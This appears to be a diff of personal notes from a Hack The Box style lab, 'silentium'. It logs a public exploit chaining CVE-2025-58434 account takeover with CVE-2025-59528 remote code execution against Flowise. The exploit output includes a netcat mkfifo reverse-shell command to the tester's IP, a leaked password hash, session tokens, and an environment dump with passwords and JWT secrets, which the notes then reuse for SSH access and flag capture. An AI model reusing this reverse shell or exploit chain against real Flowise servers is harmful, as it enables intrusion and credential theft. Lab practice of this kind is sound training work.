@@ -111,3 +111,139 @@ curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
 
 
 lets try the burps uite way
+
+https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC worked
+
+└─$ python3 main.py -u http://staging.silentium.htb --lhost 10.10.15.149 --lport 9001 --email ben@silentium.htb
+
+
+  ███████╗██╗      ██████╗ ██╗    ██╗██╗███████╗███████╗                                                                
+  ██╔════╝██║     ██╔═══██╗██║    ██║██║██╔════╝██╔════╝                                                                
+  █████╗  ██║     ██║   ██║██║ █╗ ██║██║███████╗█████╗                                                                  
+  ██╔══╝  ██║     ██║   ██║██║███╗██║██║╚════██║██╔══╝                                                                  
+  ██║     ███████╗╚██████╔╝╚███╔███╔╝██║███████║███████╗                                                                
+  ╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝                                                                
+
+  ════════════════════════════════════════════════════════════════════
+  CVE-2025-58434 │ Account Takeover via Token Disclosure │ CVSS 9.8 Critical
+  CVE-2025-59528 │ Authenticated RCE via CustomMCP Node  │ CVSS Critical    
+  ════════════════════════════════════════════════════════════════════
+    ⚠  FOR EDUCATIONAL / AUTHORIZED SECURITY TESTING ONLY  ⚠
+  ════════════════════════════════════════════════════════════════════
+
+  ════════════════════════════════════════════════════════════════════
+    FULL CHAIN MODE  │  CVE-2025-58434 → CVE-2025-59528
+  ════════════════════════════════════════════════════════════════════
+
+  [Step 1] [CVE-2025-58434] Requesting forgot-password token ...
+  [*] Endpoint : http://staging.silentium.htb/api/v1/account/forgot-password
+  [*] Email    : ben@silentium.htb
+  [*] HTTP 201
+
+  ────────────────────────────────────────────────────────────────────
+    LEAKED ACCOUNT DATA
+  ────────────────────────────────────────────────────────────────────
+  User ID       : e26c9d6c-678c-4c10-9e36-01813e8fea73
+  Name          : admin
+  Email         : ben@silentium.htb
+  Credential    : $2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG
+  Status        : active
+  tempToken     : cgGGQcw8mvgdCGweBjksTyRgf1glFwCHRX2kdT1czf2qjKWA0TGh7S5FQIZzMIzk
+  tokenExpiry   : 2026-09-20T07:48:25.181Z
+  ────────────────────────────────────────────────────────────────────
+  [+] tempToken  : cgGGQcw8mvgdCGweBjksTyRgf1glFwCHRX2kdT1czf2qjKWA0TGh7S5FQIZzMIzk
+  [+] Expiry     : 2026-09-20T07:48:25.181Z
+  [!] VULNERABLE — token disclosed without authentication!
+
+  [Step 2] [CVE-2025-58434] Resetting password → Flowise@Pwn3d2025!
+  [*] Endpoint     : http://staging.silentium.htb/api/v1/account/reset-password
+  [*] New password : Flowise@Pwn3d2025!
+  [*] HTTP 201
+  [+] Password reset SUCCESSFUL (tempToken cleared)
+  [+] Account takeover complete  →  ben@silentium.htb / Flowise@Pwn3d2025!
+
+  [Step 3] [Auth] Logging in to extract session cookies ...
+  [*] Endpoint : http://staging.silentium.htb/api/v1/auth/login
+  [*] Email    : ben@silentium.htb
+  [*] HTTP 200
+
+  ────────────────────────────────────────────────────────────────────
+    EXTRACTED SESSION COOKIES
+  ────────────────────────────────────────────────────────────────────
+  token          : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...
+  refreshToken   : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...
+  connect_sid    : s%3Af4N7z7c1pKrFj9EDbPpNUQDsflIXlbw6.UHjfdT9gh5M%2BioutyB2vFk6gLoIHPy1Ri...
+  ────────────────────────────────────────────────────────────────────
+  [+] Session cookies obtained ✓
+
+  [Step 4] [CVE-2025-59528] Executing RCE via CustomMCP ...
+  [*] Endpoint : http://staging.silentium.htb/api/v1/node-load-method/customMCP
+  [*] Command  : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.149 9001 >/tmp/f
+  [*] Payload  : ({x:(function(){const cp=process.mainModule.require("child_process");const b64="cm0gL3Rt...
+
+  ────────────────────────────────────────────────────────────────────
+    RCE RESULT
+  ────────────────────────────────────────────────────────────────────
+  Mode    : Reverse Shell
+  Command : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.149 9001 >/tmp/f
+  LHOST   : 10.10.15.149
+  LPORT   : 9001
+
+  [+] Reverse shell payload fired!
+  [!] Waiting for connection on 10.10.15.149:9001 ...
+  [!] Make sure your listener is running:  nc -lvnp 9001
+  ────────────────────────────────────────────────────────────────────
+
+  ════════════════════════════════════════════════════════════════════
+    CHAIN COMPLETE
+  ════════════════════════════════════════════════════════════════════
+  CVE-2025-58434  ✓  ATO   → ben@silentium.htb / Flowise@Pwn3d2025!
+  CVE-2025-59528  ✓  RCE   → shell connecting to 10.10.15.149:9001
+  ════════════════════════════════════════════════════════════════════
+
+
+
+
+FLOWISE_PASSWORD=F1l3_d0ck3r
+ALLOW_UNAUTHORIZED_CERTS=true
+NODE_VERSION=20.19.4
+HOSTNAME=c78c3cceb7ba
+YARN_VERSION=1.22.22
+SMTP_PORT=1025
+SHLVL=3
+PORT=3000
+HOME=/root
+SENDER_EMAIL=ben@silentium.htb
+PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
+JWT_ISSUER=ISSUER
+JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+LLM_PROVIDER=nvidia-nim
+SMTP_USERNAME=test
+SMTP_SECURE=false
+JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
+FLOWISE_USERNAME=ben
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+DATABASE_PATH=/root/.flowise
+JWT_TOKEN_EXPIRY_IN_MINUTES=360
+JWT_AUDIENCE=AUDIENCE
+SECRETKEY_PATH=/root/.flowise
+PWD=/
+SMTP_PASSWORD=r04D!!_R4ge
+NVIDIA_NIM_LLM_MODE=managed
+SMTP_HOST=mailhog
+JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+SMTP_USER=test
+
+
+
+F1l3_d0ck3r
+r04D!!_R4ge - ssh
+
+ben@silentium:~$ cat user.txt
+32464a3447ad384effc23e1a51ccc69d
+ben@silentium:~$ 
+
+exploited to root through pack2 vuln
+ poc by vozec
+
+ 
